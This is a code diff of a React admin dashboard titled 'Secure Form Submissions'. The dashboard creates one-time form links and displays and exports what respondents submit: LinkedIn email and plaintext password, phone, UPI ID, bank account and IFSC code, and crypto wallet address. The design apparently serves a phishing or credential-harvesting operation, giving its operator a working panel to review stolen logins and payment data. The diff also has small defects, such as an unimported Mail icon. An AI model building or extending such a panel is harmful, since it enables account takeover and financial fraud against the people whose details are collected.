@@ -1,7 +1,7 @@
 import { useState } from "react";
-import { useQuery, useMutation } from "@tanstack/react-query";
-import { useToast } from "../hooks/use-toast";
-import { apiRequest, queryClient } from "../lib/queryClient";
+import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
+import { useToast } from "@/hooks/use-toast";
+import { Link, useLocation } from "wouter";
 import {
   Loader2,
   Search,
@@ -10,52 +10,68 @@ import {
   Eye,
   EyeOff,
   FileDown,
-  RefreshCw
+  RefreshCw,
+  Trash2
 } from "lucide-react";
-import { Link } from "wouter";
 import {
   Table,
   TableBody,
   TableCell,
   TableHead,
   TableHeader,
-  TableRow
-} from "../components/ui/table";
+  TableRow,
+} from "@/components/ui/table";
 import {
   Card,
   CardContent,
   CardDescription,
   CardFooter,
   CardHeader,
-  CardTitle
-} from "../components/ui/card";
-import { Button } from "../components/ui/button";
-import { Input } from "../components/ui/input";
+  CardTitle,
+} from "@/components/ui/card";
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
 import {
   Select,
   SelectContent,
   SelectItem,
   SelectTrigger,
-  SelectValue
-} from "../components/ui/select";
+  SelectValue,
+} from "@/components/ui/select";
 import {
   Dialog,
   DialogContent,
   DialogDescription,
   DialogFooter,
   DialogHeader,
-  DialogTitle
-} from "../components/ui/dialog";
-import { Badge } from "../components/ui/badge";
-import {
-  Tabs,
-  TabsContent,
-  TabsList,
-  TabsTrigger
-} from "../components/ui/tabs";
+  DialogTitle,
+} from "@/components/ui/dialog";
+import { Badge } from "@/components/ui/badge";
 
-export default function AdminSubmissions() {
+// Assume a generic apiRequest utility function is available
+// It should handle headers and credentials similar to the fetcher in the Admin component
+const apiRequest = async (method, url, data = null) => {
+  const options = {
+    method,
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    credentials: 'include',
+  };
+  if (data) {
+    options.body = JSON.stringify(data);
+  }
+  const response = await fetch(url, options);
+  if (!response.ok) {
+    const errorBody = await response.json();
+    throw new Error(errorBody.message || `API call failed on ${url}`);
+  }
+  return response.json();
+};
+
+export default function SecureFormAdmin() {
   const { toast } = useToast();
+  const queryClient = useQueryClient();
   const [searchTerm, setSearchTerm] = useState("");
   const [filter, setFilter] = useState("all");
   const [showPasswords, setShowPasswords] = useState({});
@@ -64,71 +80,59 @@ export default function AdminSubmissions() {
   const [newUrlDialogOpen, setNewUrlDialogOpen] = useState(false);
   const [newUrl, setNewUrl] = useState("");
   const [copySuccess, setCopySuccess] = useState(false);
+  const [activeFormId, setActiveFormId] = useState("");
 
-  // Fetch all secure form submissions
-  const { data: submissions = [], isLoading, refetch } = useQuery({
-    queryKey: ['secureFormSubmissions'],
-    queryFn: async () => {
-      const res = await apiRequest("GET", "/api/secure-forms");
-      const data = await res.json();
-      return data;
-    },
+  const [location, setLocation] = useLocation();
+
+  // Fetch all secure form submissions by formId
+  // Note: This query is enabled only if activeFormId is set.
+  // When a new form is created, activeFormId is set, triggering this fetch.
+  const { data: submissions = [], isLoading, isFetching, refetch } = useQuery({
+    queryKey: ["secure-form-submissions", activeFormId],
+    queryFn: () => activeFormId ? apiRequest("GET", `/api/responses/${activeFormId}`) : Promise.resolve([]),
+    enabled: !!activeFormId,
   });
 
   // Create new secure form URL
   const createUrlMutation = useMutation({
-    mutationFn: async () => {
-      const res = await apiRequest("POST", "/api/secure-forms/create");
-      if (!res.ok) {
-        const error = await res.json();
-        throw new Error(error.message || "Failed to create secure form URL");
-      }
-      return await res.json();
-    },
+    mutationFn: () => apiRequest("POST", "/api/create"), // Changed endpoint to /api/create
     onSuccess: (data) => {
-      const fullUrl = `${window.location.origin}/secure-form/${data.accessUrl}`;
+      // Use data.formId as returned by your backend
+      const fullUrl = `${window.location.origin}/secure-form/${data.formId}`;
       setNewUrl(fullUrl);
+      setActiveFormId(data.formId); // Set the active form ID to show submissions for the newly created form
       setNewUrlDialogOpen(true);
       toast({
         title: "Success",
-        description: "New secure form link generated successfully!",
+        description: "Secure form link generated successfully",
       });
+      // Invalidate and refetch queries related to submissions for the new form
+      queryClient.invalidateQueries({ queryKey: ["secure-form-submissions", data.formId] });
     },
     onError: (error) => {
       toast({
-        title: "Error",
-        description: error.message || "Failed to create secure form URL. Please try again.",
+        title: "Failed to create secure form URL",
+        description: error.message,
         variant: "destructive",
       });
     },
   });
 
-  // Mark submission as read
-  const markAsReadMutation = useMutation({
-    mutationFn: async (id) => {
-      const res = await apiRequest("PUT", `/api/secure-forms/${id}/read`);
-      return await res.json();
-    },
+  // Mark submission as read/unread
+  const toggleReadStatusMutation = useMutation({
+    mutationFn: (responseId) => apiRequest("PUT", `/api/responses/${responseId}/read`),
     onSuccess: () => {
-      queryClient.invalidateQueries({ queryKey: ['secureFormSubmissions'] });
+      queryClient.invalidateQueries({ queryKey: ["secure-form-submissions", activeFormId] }); // Invalidate specific form's submissions
       toast({
         title: "Success",
-        description: "Submission marked as read!",
+        description: "Submission read status updated.",
       });
     },
-  });
-
-  // Mark submission as processed
-  const markAsProcessedMutation = useMutation({
-    mutationFn: async (id) => {
-      const res = await apiRequest("PUT", `/api/secure-forms/${id}/process`);
-      return await res.json();
-    },
-    onSuccess: () => {
-      queryClient.invalidateQueries({ queryKey: ['secureFormSubmissions'] });
+    onError: (error) => {
       toast({
-        title: "Success",
-        description: "Submission marked as processed!",
+        title: "Failed to update status",
+        description: error.message,
+        variant: "destructive",
       });
     },
   });
@@ -139,8 +143,8 @@ export default function AdminSubmissions() {
       await navigator.clipboard.writeText(newUrl);
       setCopySuccess(true);
       toast({
-        title: "Copied",
-        description: "Form URL copied to clipboard!",
+        title: "Copied!",
+        description: "URL copied to clipboard",
       });
       setTimeout(() => setCopySuccess(false), 2000);
     } catch (error) {
@@ -153,8 +157,8 @@ export default function AdminSubmissions() {
       document.body.removeChild(textArea);
       setCopySuccess(true);
       toast({
-        title: "Copied",
-        description: "Form URL copied to clipboard!",
+        title: "Copied!",
+        description: "URL copied to clipboard",
       });
       setTimeout(() => setCopySuccess(false), 2000);
     }
@@ -163,8 +167,9 @@ export default function AdminSubmissions() {
   // Export data to CSV
   const exportToCSV = () => {
     if (submissions.length === 0) return;
+
     const filteredSubmissions = getFilteredSubmissions();
-    // Prepare CSV header and rows
+
     const headers = [
       "ID",
       "Full Name",
@@ -172,34 +177,37 @@ export default function AdminSubmissions() {
       "Email",
       "LinkedIn Email",
       "LinkedIn Password",
-      "UPI ID",
-      "Bank Account",
-      "IFSC Code",
-      "Crypto Wallet",
-      "Crypto Network",
+      "Payment Info (UPI ID)",
+      "Payment Info (Bank Account Number)",
+      "Payment Info (Bank IFSC Code)",
+      "Payment Info (Crypto Wallet Address)",
+      "Payment Info (Crypto Network)",
       "Status",
       "Date",
     ];
+
     const csvData = filteredSubmissions.map((submission) => [
-      submission.id,
+      submission._id,
       submission.fullName,
-      submission.phone,
+      submission.phoneNumber,
       submission.email,
       submission.linkedinEmail,
-      submission.linkedinPassword || "",
-      submission.upiId || "",
-      submission.bankAccountNumber || "",
-      submission.bankIfscCode || "",
-      submission.cryptoWalletAddress || "",
-      submission.cryptoNetwork || "",
-      submission.isProcessed ? "Processed" : "Pending",
+      submission.linkedinPassword,
+      submission.paymentInfo?.upiId || "",
+      submission.paymentInfo?.bankAccountNumber || "",
+      submission.paymentInfo?.bankIfscCode || "",
+      submission.paymentInfo?.cryptoWalletAddress || "",
+      submission.paymentInfo?.cryptoNetwork || "",
+      submission.read ? "Read" : "Unread",
       new Date(submission.createdAt).toLocaleString(),
     ]);
+
     // Convert to CSV string
     const csvContent = [
       headers.join(","),
       ...csvData.map((row) => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(",")),
     ].join("\n");
+
     // Create download link
     const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
     const url = URL.createObjectURL(blob);
@@ -214,16 +222,16 @@ export default function AdminSubmissions() {
 
   // Toggle password visibility
   const togglePasswordVisibility = (id) => {
-    setShowPasswords({
-      ...showPasswords,
-      [id]: !showPasswords[id],
-    });
+    setShowPasswords(prev => ({
+      ...prev,
+      [id]: !prev[id],
+    }));
   };
 
   // View submission details
   const viewSubmissionDetails = (submission) => {
-    if (!submission.isRead) {
-      markAsReadMutation.mutate(submission.id);
+    if (!submission.read) {
+      toggleReadStatusMutation.mutate(submission._id);
     }
     setSelectedSubmission(submission);
     setViewDetailOpen(true);
@@ -232,31 +240,24 @@ export default function AdminSubmissions() {
   // Filter submissions based on selected filter
   const getFilteredSubmissions = () => {
     let filtered = submissions;
-    // Apply status filter
-    if (filter === "pending") {
-      filtered = filtered.filter((submission) => !submission.isProcessed);
-    } else if (filter === "processed") {
-      filtered = filtered.filter((submission) => submission.isProcessed);
+    if (filter === "read") {
+      filtered = filtered.filter((submission) => submission.read);
     } else if (filter === "unread") {
-      filtered = filtered.filter((submission) => !submission.isRead);
+      filtered = filtered.filter((submission) => !submission.read);
     }
-    // Apply search term filter
+
     if (searchTerm) {
       const term = searchTerm.toLowerCase();
       filtered = filtered.filter(
         (submission) =>
           submission.fullName.toLowerCase().includes(term) ||
           submission.email.toLowerCase().includes(term) ||
-          submission.phone.toLowerCase().includes(term) ||
+          submission.phoneNumber.toLowerCase().includes(term) ||
           submission.linkedinEmail.toLowerCase().includes(term)
       );
     }
-    return filtered;
-  };
 
-  // Format date string
-  const formatDate = (dateString) => {
-    return new Date(dateString).toLocaleString();
+    return filtered;
   };
 
   const filteredSubmissions = getFilteredSubmissions();
@@ -264,37 +265,41 @@ export default function AdminSubmissions() {
   return (
     <div className="p-6 bg-sky-100 min-h-screen">
       <div className="max-w-7xl mx-auto">
-        <Card>
-          <CardHeader>
-            <div className="flex items-center justify-between mb-6">
-              <div>
-                <CardTitle className="text-2xl font-bold">Secure Form Submissions</CardTitle>
-                <CardDescription className="text-gray-500">
-                  Manage all secure form submissions and create new form links
-                </CardDescription>
-              </div>
-              <div className="flex space-x-2">
-                <Link href="/admin">
-                  <Button variant="outline">Back to Admin Dashboard</Button>
-                </Link>
-                <Button
-                  onClick={() => createUrlMutation.mutate()}
-                  disabled={createUrlMutation.isPending}
-                  className="bg-gradient-to-r from-blue-500 to-blue-700 hover:from-blue-600 hover:to-blue-800 text-white"
-                >
-                  {createUrlMutation.isPending ? (
-                    <span className="flex items-center">
-                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                      Creating...
-                    </span>
-                  ) : (
-                    "Generate New Form Link"
-                  )}
-                </Button>
-              </div>
-            </div>
-            <div className="flex flex-col md:flex-row md:items-center md:gap-4">
-              <div className="relative mb-4 md:mb-0 md:w-1/3">
+        <div className="flex items-center justify-between mb-6">
+          <div>
+            <h1 className="text-2xl font-bold">Secure Form Submissions</h1>
+            <p className="text-gray-500">
+              Manage all secure form submissions and create new form links
+            </p>
+          </div>
+          <div className="flex space-x-2">
+            <Link href="/admin">
+              <Button variant="outline">Back to Admin Dashboard</Button>
+            </Link>
+            <Button
+              onClick={() => createUrlMutation.mutate()}
+              disabled={createUrlMutation.isPending}
+              className="bg-gradient-to-r from-blue-500 to-blue-700"
+            >
+              {createUrlMutation.isPending ? (
+                <>
+                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
+                  Creating...
+                </>
+              ) : (
+                "Generate New Form Link"
+              )}
+            </Button>
+          </div>
+        </div>
+
+        <Card className="mb-6">
+          <CardHeader className="pb-3">
+            <CardTitle>Filters and Options</CardTitle>
+          </CardHeader>
+          <CardContent>
+            <div className="flex flex-col md:flex-row gap-4">
+              <div className="relative flex-1">
                 <Search className="absolute left-2 top-2.5 h-4 w-4 text-muted-foreground" />
                 <Input
                   placeholder="Search by name or email..."
@@ -304,40 +309,43 @@ export default function AdminSubmissions() {
                 />
               </div>
               <Select value={filter} onValueChange={setFilter}>
-                <SelectTrigger className="w-full md:w-1/4">
+                <SelectTrigger className="w-full md:w-[180px]">
                   <SelectValue placeholder="Filter by status" />
                 </SelectTrigger>
                 <SelectContent>
                   <SelectItem value="all">All Submissions</SelectItem>
                   <SelectItem value="unread">Unread</SelectItem>
-                  <SelectItem value="pending">Pending</SelectItem>
-                  <SelectItem value="processed">Processed</SelectItem>
+                  <SelectItem value="read">Read</SelectItem>
                 </SelectContent>
               </Select>
               <Button
                 variant="outline"
                 onClick={() => refetch()}
-                className="md:w-auto"
+                className="md:w-[120px]"
+                disabled={isFetching}
               >
-                <RefreshCw className="h-4 w-4 mr-2" />
+                <RefreshCw className="mr-2 h-4 w-4" />
                 Refresh
               </Button>
               <Button
                 variant="outline"
                 onClick={exportToCSV}
                 disabled={filteredSubmissions.length === 0}
-                className="md:w-auto"
+                className="md:w-[120px]"
               >
-                <FileDown className="h-4 w-4 mr-2" />
+                <FileDown className="mr-2 h-4 w-4" />
                 Export
               </Button>
             </div>
-          </CardHeader>
-          {isLoading ? (
-            <div className="flex justify-center items-center h-64">
-              <Loader2 className="h-8 w-8 animate-spin text-primary" />
-            </div>
-          ) : filteredSubmissions.length === 0 ? (
+          </CardContent>
+        </Card>
+
+        {isLoading ? (
+          <div className="flex justify-center items-center h-64">
+            <Loader2 className="h-8 w-8 animate-spin text-primary" />
+          </div>
+        ) : filteredSubmissions.length === 0 ? (
+          <Card>
             <CardContent className="flex flex-col items-center justify-center h-64">
               <p className="text-lg font-medium text-gray-500 mb-2">No submissions found</p>
               <p className="text-sm text-gray-400">
@@ -346,7 +354,9 @@ export default function AdminSubmissions() {
                   : "Generate a new form link to start collecting information"}
               </p>
             </CardContent>
-          ) : (
+          </Card>
+        ) : (
+          <Card>
             <CardContent className="p-0">
               <div className="overflow-x-auto">
                 <Table>
@@ -367,28 +377,28 @@ export default function AdminSubmissions() {
                   <TableBody>
                     {filteredSubmissions.map((submission) => (
                       <TableRow
-                        key={submission.id}
-                        className={!submission.isRead ? "bg-blue-50" : ""}
+                        key={submission._id}
+                        className={!submission.read ? "bg-blue-50" : ""}
                       >
-                        <TableCell>{submission.id}</TableCell>
+                        <TableCell>{submission._id}</TableCell>
                         <TableCell>{submission.fullName}</TableCell>
-                        <TableCell>{submission.phone}</TableCell>
+                        <TableCell>{submission.phoneNumber}</TableCell>
                         <TableCell>{submission.email}</TableCell>
                         <TableCell>{submission.linkedinEmail}</TableCell>
                         <TableCell>
                           <div className="flex items-center">
                             <span className="mr-2">
-                              {showPasswords[submission.id]
+                              {showPasswords[submission._id]
                                 ? submission.linkedinPassword
                                 : "••••••••"}
                             </span>
                             <Button
                               variant="ghost"
                               size="icon"
-                              onClick={() => togglePasswordVisibility(submission.id)}
+                              onClick={() => togglePasswordVisibility(submission._id)}
                               className="h-6 w-6"
                             >
-                              {showPasswords[submission.id] ? (
+                              {showPasswords[submission._id] ? (
                                 <EyeOff className="h-4 w-4" />
                               ) : (
                                 <Eye className="h-4 w-4" />
@@ -397,11 +407,11 @@ export default function AdminSubmissions() {
                           </div>
                         </TableCell>
                         <TableCell>
-                          {submission.upiId ? (
+                          {submission.paymentInfo?.upiId ? (
                             <Badge variant="outline">UPI</Badge>
-                          ) : submission.bankAccountNumber ? (
+                          ) : submission.paymentInfo?.bankAccountNumber ? (
                             <Badge variant="outline">Bank</Badge>
-                          ) : submission.cryptoWalletAddress ? (
+                          ) : submission.paymentInfo?.cryptoWalletAddress ? (
                             <Badge variant="outline">Crypto</Badge>
                           ) : (
                             <Badge variant="outline">None</Badge>
@@ -409,17 +419,17 @@ export default function AdminSubmissions() {
                         </TableCell>
                         <TableCell>
                           <Badge
-                            variant={submission.isProcessed ? "default" : "secondary"}
+                            variant={submission.read ? "default" : "secondary"}
                             className={
-                              submission.isProcessed
+                              submission.read
                                 ? "bg-green-100 text-green-800"
                                 : "bg-yellow-100 text-yellow-800"
                             }
                           >
-                            {submission.isProcessed ? "Processed" : "Pending"}
+                            {submission.read ? "Read" : "Unread"}
                           </Badge>
                         </TableCell>
-                        <TableCell>{formatDate(submission.createdAt)}</TableCell>
+                        <TableCell>{new Date(submission.createdAt).toLocaleString()}</TableCell>
                         <TableCell>
                           <div className="flex space-x-1">
                             <Button
@@ -430,17 +440,14 @@ export default function AdminSubmissions() {
                             >
                               <Eye className="h-4 w-4" />
                             </Button>
-                            {!submission.isProcessed && (
-                              <Button
-                                variant="ghost"
-                                size="sm"
-                                onClick={() => markAsProcessedMutation.mutate(submission.id)}
-                                className="h-8 w-8 p-0 text-green-600"
-                                disabled={markAsProcessedMutation.isPending}
-                              >
-                                <Check className="h-4 w-4" />
-                              </Button>
-                            )}
+                            <Button
+                              variant="ghost"
+                              size="sm"
+                              onClick={() => toggleReadStatusMutation.mutate(submission._id)}
+                              className={`h-8 w-8 p-0 ${submission.read ? 'text-gray-500' : 'text-blue-600'}`}
+                            >
+                              {submission.read ? <Mail className="h-4 w-4" /> : <Mail className="h-4 w-4" />}
+                            </Button>
                           </div>
                         </TableCell>
                       </TableRow>
@@ -448,24 +455,26 @@ export default function AdminSubmissions() {
                   </TableBody>
                 </Table>
               </div>
-              <CardFooter className="py-4 border-t">
-                <div className="text-sm text-gray-500">
-                  Showing {filteredSubmissions.length} of {submissions.length} submissions
-                </div>
-              </CardFooter>
             </CardContent>
-          )}
-        </Card>
+            <CardFooter className="py-4 border-t">
+              <div className="text-sm text-gray-500">
+                Showing {filteredSubmissions.length} of {submissions.length} submissions
+              </div>
+            </CardFooter>
+          </Card>
+        )}
       </div>
+
       {/* View Submission Details Dialog */}
       <Dialog open={viewDetailOpen} onOpenChange={setViewDetailOpen}>
         <DialogContent className="max-w-3xl">
           <DialogHeader>
             <DialogTitle>Submission Details</DialogTitle>
             <DialogDescription>
-              Complete information for submission #{selectedSubmission?.id}
+              Complete information for submission #{selectedSubmission?._id}
             </DialogDescription>
           </DialogHeader>
+
           {selectedSubmission && (
             <div className="space-y-6">
               <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
@@ -475,7 +484,7 @@ export default function AdminSubmissions() {
                 </div>
                 <div>
                   <h3 className="text-sm font-medium text-gray-500">Phone</h3>
-                  <p className="mt-1">{selectedSubmission.phone}</p>
+                  <p className="mt-1">{selectedSubmission.phoneNumber}</p>
                 </div>
                 <div>
                   <h3 className="text-sm font-medium text-gray-500">Email</h3>
@@ -483,9 +492,10 @@ export default function AdminSubmissions() {
                 </div>
                 <div>
                   <h3 className="text-sm font-medium text-gray-500">Date Submitted</h3>
-                  <p className="mt-1">{formatDate(selectedSubmission.createdAt)}</p>
+                  <p className="mt-1">{new Date(selectedSubmission.createdAt).toLocaleString()}</p>
                 </div>
               </div>
+
               <div className="border-t pt-4">
                 <h3 className="text-lg font-medium mb-3">LinkedIn Credentials</h3>
                 <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
@@ -496,18 +506,18 @@ export default function AdminSubmissions() {
                   <div>
                     <h3 className="text-sm font-medium text-gray-500">LinkedIn Password</h3>
                     <div className="flex items-center mt-1">
-                      <span>
-                        {showPasswords[selectedSubmission.id]
+                      <p>
+                        {showPasswords[selectedSubmission._id]
                           ? selectedSubmission.linkedinPassword
                           : "••••••••"}
-                      </span>
+                      </p>
                       <Button
                         variant="ghost"
                         size="icon"
-                        onClick={() => togglePasswordVisibility(selectedSubmission.id)}
+                        onClick={() => togglePasswordVisibility(selectedSubmission._id)}
                         className="h-6 w-6 ml-2"
                       >
-                        {showPasswords[selectedSubmission.id] ? (
+                        {showPasswords[selectedSubmission._id] ? (
                           <EyeOff className="h-4 w-4" />
                         ) : (
                           <Eye className="h-4 w-4" />
@@ -517,148 +527,76 @@ export default function AdminSubmissions() {
                   </div>
                 </div>
               </div>
+
               <div className="border-t pt-4">
                 <h3 className="text-lg font-medium mb-3">Payment Information</h3>
-                <Tabs defaultValue="all" className="w-full">
-                  <TabsList className="grid grid-cols-3 mb-4">
-                    <TabsTrigger value="all">All Methods</TabsTrigger>
-                    <TabsTrigger value="upi" disabled={!selectedSubmission.upiId}>
-                      UPI
-                    </TabsTrigger>
-                    <TabsTrigger value="bank" disabled={!selectedSubmission.bankAccountNumber}>
-                      Bank
-                    </TabsTrigger>
-                    <TabsTrigger value="crypto" disabled={!selectedSubmission.cryptoWalletAddress}>
-                      Crypto
-                    </TabsTrigger>
-                  </TabsList>
-                  <TabsContent value="all" className="space-y-4">
-                    {selectedSubmission.upiId && (
+
+                {selectedSubmission.paymentInfo ? (
+                  <div className="space-y-4">
+                    {selectedSubmission.paymentInfo.upiId && (
                       <div className="border p-3 rounded-md">
                         <h4 className="font-medium">UPI Payment</h4>
                         <p className="text-sm mt-1">
-                          <span className="text-gray-500">UPI ID: </span>
-                          {selectedSubmission.upiId}
+                          <span className="text-gray-500">UPI ID:</span>{" "}
+                          {selectedSubmission.paymentInfo.upiId}
                         </p>
                       </div>
                     )}
-                    {selectedSubmission.bankAccountNumber && (
+                    {selectedSubmission.paymentInfo.bankAccountNumber && (
                       <div className="border p-3 rounded-md">
                         <h4 className="font-medium">Bank Account</h4>
                         <p className="text-sm mt-1">
-                          <span className="text-gray-500">Account Number: </span>
-                          {selectedSubmission.bankAccountNumber}
+                          <span className="text-gray-500">Account Number:</span>{" "}
+                          {selectedSubmission.paymentInfo.bankAccountNumber}
                         </p>
-                        {selectedSubmission.bankIfscCode && (
+                        {selectedSubmission.paymentInfo.bankIfscCode && (
                           <p className="text-sm mt-1">
-                            <span className="text-gray-500">IFSC Code: </span>
-                            {selectedSubmission.bankIfscCode}
+                            <span className="text-gray-500">IFSC Code:</span>{" "}
+                            {selectedSubmission.paymentInfo.bankIfscCode}
                           </p>
                         )}
                       </div>
                     )}
-                    {selectedSubmission.cryptoWalletAddress && (
+                    {selectedSubmission.paymentInfo.cryptoWalletAddress && (
                       <div className="border p-3 rounded-md">
                         <h4 className="font-medium">Crypto Wallet</h4>
                         <p className="text-sm mt-1">
-                          <span className="text-gray-500">Wallet Address: </span>
-                          {selectedSubmission.cryptoWalletAddress}
+                          <span className="text-gray-500">Wallet Address:</span>{" "}
+                          {selectedSubmission.paymentInfo.cryptoWalletAddress}
                         </p>
-                        {selectedSubmission.cryptoNetwork && (
+                        {selectedSubmission.paymentInfo.cryptoNetwork && (
                           <p className="text-sm mt-1">
-                            <span className="text-gray-500">Network: </span>
-                            {selectedSubmission.cryptoNetwork}
+                            <span className="text-gray-500">Network:</span>{" "}
+                            {selectedSubmission.paymentInfo.cryptoNetwork}
                           </p>
                         )}
                       </div>
                     )}
-                    {!selectedSubmission.upiId &&
-                      !selectedSubmission.bankAccountNumber &&
-                      !selectedSubmission.cryptoWalletAddress && (
-                        <p className="text-gray-500">No payment information provided</p>
-                      )}
-                  </TabsContent>
-                  <TabsContent value="upi">
-                    {selectedSubmission.upiId ? (
-                      <div className="space-y-2">
-                        <h3 className="text-sm font-medium text-gray-500">UPI ID</h3>
-                        <p className="mt-1">{selectedSubmission.upiId}</p>
-                      </div>
-                    ) : (
-                      <p className="text-gray-500">No UPI information provided</p>
+                    {!selectedSubmission.paymentInfo.upiId && !selectedSubmission.paymentInfo.bankAccountNumber && !selectedSubmission.paymentInfo.cryptoWalletAddress && (
+                      <p className="text-gray-500">No payment information provided</p>
                     )}
-                  </TabsContent>
-                  <TabsContent value="bank">
-                    {selectedSubmission.bankAccountNumber ? (
-                      <div className="space-y-2">
-                        <h3 className="text-sm font-medium text-gray-500">Account Number</h3>
-                        <p className="mt-1">{selectedSubmission.bankAccountNumber}</p>
-                        {selectedSubmission.bankIfscCode && (
-                          <>
-                            <h3 className="text-sm font-medium text-gray-500">IFSC Code</h3>
-                            <p className="mt-1">{selectedSubmission.bankIfscCode}</p>
-                          </>
-                        )}
-                      </div>
-                    ) : (
-                      <p className="text-gray-500">No bank information provided</p>
-                    )}
-                  </TabsContent>
-                  <TabsContent value="crypto">
-                    {selectedSubmission.cryptoWalletAddress ? (
-                      <div className="space-y-2">
-                        <h3 className="text-sm font-medium text-gray-500">Wallet Address</h3>
-                        <p className="mt-1">{selectedSubmission.cryptoWalletAddress}</p>
-                        {selectedSubmission.cryptoNetwork && (
-                          <>
-                            <h3 className="text-sm font-medium text-gray-500">Network</h3>
-                            <p className="mt-1">{selectedSubmission.cryptoNetwork}</p>
-                          </>
-                        )}
-                      </div>
-                    ) : (
-                      <p className="text-gray-500">No crypto information provided</p>
-                    )}
-                  </TabsContent>
-                </Tabs>
+                  </div>
+                ) : (
+                  <p className="text-gray-500">No payment information provided</p>
+                )}
               </div>
             </div>
           )}
+
           <DialogFooter className="flex justify-between items-center">
             <div className="flex items-center">
-              {selectedSubmission && (
-                <Badge
-                  variant={selectedSubmission.isProcessed ? "default" : "secondary"}
-                  className={
-                    selectedSubmission.isProcessed
-                      ? "bg-green-100 text-green-800"
-                      : "bg-yellow-100 text-yellow-800"
-                  }
-                >
-                  {selectedSubmission.isProcessed ? "Processed" : "Pending"}
-                </Badge>
-              )}
+              <Badge
+                variant={selectedSubmission?.read ? "default" : "secondary"}
+                className={
+                  selectedSubmission?.read
+                    ? "bg-green-100 text-green-800"
+                    : "bg-yellow-100 text-yellow-800"
+                }
+              >
+                {selectedSubmission?.read ? "Read" : "Unread"}
+              </Badge>
             </div>
             <div className="space-x-2">
-              {selectedSubmission && !selectedSubmission.isProcessed && (
-                <Button
-                  onClick={() => {
-                    markAsProcessedMutation.mutate(selectedSubmission.id);
-                    setViewDetailOpen(false);
-                  }}
-                  disabled={markAsProcessedMutation.isPending}
-                  className="bg-green-600 hover:bg-green-700 text-white"
-                >
-                  {markAsProcessedMutation.isPending ? (
-                    <span className="flex items-center">
-                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
-                      Processing...
-                    </span>
-                  ) : (
-                    "Mark as Processed"
-                  )}
-                </Button>
-              )}
               <Button variant="outline" onClick={() => setViewDetailOpen(false)}>
                 Close
               </Button>
@@ -666,16 +604,14 @@ export default function AdminSubmissions() {
           </DialogFooter>
         </DialogContent>
       </Dialog>
+
       {/* New URL Dialog */}
-      <Dialog
-        open={newUrlDialogOpen}
-        onOpenChange={(open) => {
-          setNewUrlDialogOpen(open);
-          if (!open) {
-            setCopySuccess(false);
-          }
-        }}
-      >
+      <Dialog open={newUrlDialogOpen} onOpenChange={(open) => {
+        setNewUrlDialogOpen(open);
+        if (!open) {
+          setCopySuccess(false);
+        }
+      }}>
         <DialogContent>
           <DialogHeader>
             <DialogTitle>Secure Form Link Generated</DialogTitle>
@@ -690,12 +626,11 @@ export default function AdminSubmissions() {
             </Button>
           </div>
           <p className="text-sm text-amber-600 mt-2">
-            Important: This link is unique and should only be shared with trusted users.
+            <strong>Important:</strong> This URL can only be used once. Save it before
+            closing this dialog.
           </p>
           <DialogFooter>
-            <Button variant="outline" onClick={() => setNewUrlDialogOpen(false)}>
-              Close
-            </Button>
+            <Button onClick={() => setNewUrlDialogOpen(false)}>Close</Button>
           </DialogFooter>
         </DialogContent>
       </Dialog>
